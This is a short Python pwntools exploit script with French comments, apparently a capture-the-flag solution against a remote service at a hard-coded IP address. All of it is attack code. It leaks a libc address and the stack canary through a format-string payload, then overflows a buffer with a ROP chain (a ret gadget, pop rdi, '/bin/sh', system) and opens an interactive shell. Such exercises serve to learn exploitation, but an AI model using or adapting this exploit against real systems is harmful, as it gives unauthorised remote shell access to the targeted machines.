from pwn import *

libc = ELF("libc.so.6")

p = remote("35.180.44.229", 1237)

# Leak la stack
p.send(b"%27$p %25$p\n")
p.recvuntil(b"Welcome : ")
leak = p.recvuntil(b"\n")

# Calcule les adresses à partir du leak
leak_lib = leak.split(b"\n")[0].split(b" ")[0]
leak_lib = int(leak_lib, 16)
leak_canary = leak.split(b"\n")[0].split(b" ")[1]
leak_canary = int(leak_canary, 16)

# Calcule l'offset
offset_lib = 0x7ffff7df9083-0x7ffff7dd5000
leak_lib_offset = leak_lib-offset_lib

# Prépare les gadgets nécessaires à la ROPchain
system = libc.sym["system"] + leak_lib_offset
pop_rdi_ret = 0x0000000000023b6a + leak_lib_offset
sh = next(libc.search(b"/bin/sh")) + leak_lib_offset
ret = 0x0000000000022679 + leak_lib_offset

payload = b"".join([
        b"B"*152,
        p64(leak_canary),
        b"C"*8,
        p64(ret), # Pour réaligner la stack
        p64(pop_rdi_ret),
        p64(sh),
        p64(system),
        b"\n"
])

p.recvuntil(b"type your secret : ")
p.send(payload)

p.interactive()